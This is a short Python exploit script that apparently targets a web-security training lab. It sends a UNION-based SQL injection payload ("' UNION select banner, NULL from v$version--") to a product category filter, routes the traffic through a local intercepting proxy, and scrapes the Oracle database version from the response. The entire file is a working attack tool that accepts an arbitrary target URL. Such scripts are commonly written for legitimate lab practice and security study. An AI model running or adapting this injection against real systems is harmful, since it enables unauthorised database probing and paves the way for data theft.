import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_database_version(url):
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select banner, NULL from v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if 'Oracle Database' in res:
        print("[+] Found the database type & version!")
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle Database Version is: %s" % version)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the database version...")
    if not exploit_sqli_database_version(url):
        print("[-] Could not determine the current database type & version in use.")
